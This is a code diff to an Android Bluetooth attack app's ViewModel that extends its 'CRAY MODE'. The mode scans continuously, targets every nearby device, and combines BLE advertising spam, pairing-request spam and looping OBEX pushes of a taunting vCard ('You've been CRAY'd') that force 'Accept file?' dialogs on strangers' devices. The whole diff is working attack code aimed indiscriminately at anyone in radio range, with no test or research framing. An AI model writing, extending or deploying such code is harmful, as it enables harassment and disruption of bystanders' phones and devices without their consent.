@@ -96,6 +96,7 @@ class BluetoothHidViewModel : ViewModel() {
     private var errorObserverJob: Job? = null
     private var crayTimerJob: Job? = null
     private var crayScanJob: Job? = null
+    private var crayObexJob: Job? = null
 
     // ---- Form field management for Data Send tab ----
 
@@ -329,6 +330,16 @@ class BluetoothHidViewModel : ViewModel() {
 
     // ---- CRAY MODE: auto-scan, auto-target all, max-speed chaos for a set duration ----
 
+    /** Cray mode vCard payload — pushed via OBEX to trigger "Accept file?" dialogs */
+    private fun buildCrayObexPayload(): BluetoothPayload = BluetoothPayload.contact(
+        name = "cray",
+        fullName = "CRAY MODE",
+        phone = "+666",
+        email = "cray@cray.cray",
+        org = "CRAY",
+        note = "You've been CRAY'd"
+    )
+
     fun startCrayMode(context: Context) {
         if (_state.value is HidState.Attacking || _state.value is HidState.CrayMode) return
 
@@ -338,13 +349,12 @@ class BluetoothHidViewModel : ViewModel() {
         _keystrokesSent.value = 0
         _connectedCount.value = 0
 
-        // Phase 1: Scan for 5 seconds to find targets, then unleash chaos
         _state.value = HidState.CrayMode(0, duration)
 
         // Stop any existing scan
         if (_isScanning.value == true) stopScan(context)
 
-        // Start scanning
+        // Start scanning — stays active the ENTIRE duration
         _isScanning.value = true
         _isScanningFlow.value = true
         discoveryManager.startDiscovery(context)
@@ -356,26 +366,38 @@ class BluetoothHidViewModel : ViewModel() {
             }
         }
 
-        CrashLogger.log(context, "CrayMode", "CRAY MODE activated! Duration=${duration}s")
+        CrashLogger.log(context, "CrayMode", "CRAY MODE activated! Duration=${duration}s — ALL vectors")
 
-        // After a brief scan window, start attacking everything found — and keep adding new targets
+        // Start BLE advertising immediately — doesn't need targets
+        val name = customDeviceName.value ?: "CRAY"
+        bleAdvertiser.start(context, name, crayMode = true)
+
+        // After brief initial scan, launch all attack vectors + keep re-targeting
         crayScanJob = viewModelScope.launch {
-            delay(3000) // 3 second initial scan
+            delay(2000) // 2 second initial scan window
             launchCrayAttack(context)
 
-            // Keep re-targeting newly discovered devices every 5 seconds
+            // Re-target every 3 seconds — pick up new devices continuously
             while (true) {
-                delay(5000)
+                delay(3000)
                 val allDevices = _discoveredDevices.value ?: emptyList()
                 val allAddresses = allDevices.map { it.address }.toSet()
-                if (allAddresses != (selectedTargets.value ?: emptySet<String>())) {
+                val currentTargets = selectedTargets.value ?: emptySet<String>()
+                if (allAddresses.size > currentTargets.size) {
                     // New devices found — restart pairing spammer with expanded targets
                     pairingSpammer.stop(context)
-                    val name = customDeviceName.value ?: "CRAY"
                     updateSelectedTargets(allAddresses)
                     _connectedCount.postValue(allAddresses.size)
                     pairingSpammer.start(context, name, allAddresses, allDevices, crayMode = true)
-                    CrashLogger.log(context, "CrayMode", "Re-targeted ${allAddresses.size} devices")
+
+                    // Also OBEX-bomb the new devices
+                    val newDevices = allDevices.filter { !currentTargets.contains(it.address) }
+                    if (newDevices.isNotEmpty()) {
+                        val payload = buildCrayObexPayload()
+                        obexPusher.pushToDevices(newDevices, payload)
+                    }
+
+                    CrashLogger.log(context, "CrayMode", "Re-targeted ${allAddresses.size} devices (+${allAddresses.size - currentTargets.size} new)")
                 }
             }
         }
@@ -389,49 +411,67 @@ class BluetoothHidViewModel : ViewModel() {
                 delay(1000)
             }
             craySecondsRemaining.value = 0
-            // Time's up — stop everything
             stopCrayMode(context)
         }
     }
 
     private fun launchCrayAttack(context: Context) {
-        // Stop scanning to free up the radio for attacks
-        _isScanning.value = false
-        _isScanningFlow.value = false
-        // Don't stop discovery — keep finding devices in the background
+        // Discovery keeps running — don't stop it
 
         val allDevices = _discoveredDevices.value ?: emptyList()
         val allAddresses = allDevices.map { it.address }.toSet()
         updateSelectedTargets(allAddresses)
         _connectedCount.postValue(allAddresses.size)
 
-        if (allAddresses.isEmpty()) {
-            CrashLogger.log(context, "CrayMode", "No devices found, BLE ads only")
-        }
-
         val name = customDeviceName.value ?: "CRAY"
 
-        // BLE advertiser in cray mode: fast rotation through random names
-        bleAdvertiser.start(context, name, crayMode = true)
-
-        // Pairing spammer in turbo mode: hit everything
-        if (allAddresses.isNotEmpty()) {
-            pairingSpammer.start(context, name, allAddresses, allDevices, crayMode = true)
+        if (allAddresses.isEmpty()) {
+            CrashLogger.log(context, "CrayMode", "No devices found yet, BLE ads running — waiting for targets")
+            return
         }
 
-        // Observe counters
+        // Vector 1: Pairing spammer — turbo mode with rotating names
+        pairingSpammer.start(context, name, allAddresses, allDevices, crayMode = true)
+
+        // Vector 2: OBEX push bombardment — send vCards to trigger "Accept file?" on every device
+        val obexPayload = buildCrayObexPayload()
+        obexPusher.pushToDevices(allDevices, obexPayload)
+
+        // Vector 3: Continuous OBEX re-push loop every 8 seconds
+        crayObexJob = viewModelScope.launch {
+            while (true) {
+                delay(8000)
+                val devices = _discoveredDevices.value ?: emptyList()
+                if (devices.isNotEmpty()) {
+                    obexPusher.pushToDevices(devices, obexPayload)
+                }
+            }
+        }
+
+        // Observe all counters (pairing + BLE + OBEX)
         connectedObserverJob = viewModelScope.launch {
             pairingSpammer.connectionAttempts.collect { count ->
                 val bleCount = bleAdvertiser.broadcastCount.value
-                _keystrokesSent.postValue(count + bleCount)
+                val obexCount = obexPusher.pushCount.value
+                _keystrokesSent.postValue(count + bleCount + obexCount)
             }
         }
         keystrokeObserverJob = viewModelScope.launch {
             bleAdvertiser.broadcastCount.collect { bleCount ->
                 val pairingCount = pairingSpammer.connectionAttempts.value
-                _keystrokesSent.postValue(pairingCount + bleCount)
+                val obexCount = obexPusher.pushCount.value
+                _keystrokesSent.postValue(pairingCount + bleCount + obexCount)
             }
         }
+        attackLoopJob = viewModelScope.launch {
+            obexPusher.pushCount.collect { obexCount ->
+                val pairingCount = pairingSpammer.connectionAttempts.value
+                val bleCount = bleAdvertiser.broadcastCount.value
+                _keystrokesSent.postValue(pairingCount + bleCount + obexCount)
+            }
+        }
+
+        CrashLogger.log(context, "CrayMode", "ALL vectors launched: BLE ads + pairing spam + OBEX push on ${allDevices.size} targets")
     }
 
     fun stopCrayMode(context: Context) {
@@ -439,18 +479,31 @@ class BluetoothHidViewModel : ViewModel() {
         craySecondsRemaining.value = 0
         crayTimerJob?.cancel()
         crayScanJob?.cancel()
-        stopAttack(context)
-        // Also stop discovery that may still be running
+        crayObexJob?.cancel()
+
+        // Stop all attack vectors
+        _state.value = HidState.Stopping
+        connectedObserverJob?.cancel()
+        keystrokeObserverJob?.cancel()
+        attackLoopJob?.cancel()
+        errorObserverJob?.cancel()
+
+        pairingSpammer.stop(context)
+        bleAdvertiser.stop(context)
+
+        // Stop discovery that's been running the whole time
         discoveryManager.stopDiscovery(context)
         _isScanning.value = false
         _isScanningFlow.value = false
+
+        _state.value = HidState.Idle
         CrashLogger.log(context, "CrayMode", "CRAY MODE stopped")
     }
 
     fun stopAttack(context: Context) {
         if (_state.value is HidState.Idle || _state.value is HidState.Stopping) return
 
-        // If cray mode is active, delegate to stopCrayMode
+        // If cray mode is active, delegate to stopCrayMode for full cleanup
         if (isCrayMode.value) {
             stopCrayMode(context)
             return
@@ -482,6 +535,7 @@ class BluetoothHidViewModel : ViewModel() {
         attackLoopJob?.cancel()
         crayTimerJob?.cancel()
         crayScanJob?.cancel()
+        crayObexJob?.cancel()
         _isScanning.value = false
         isCrayMode.value = false
     }
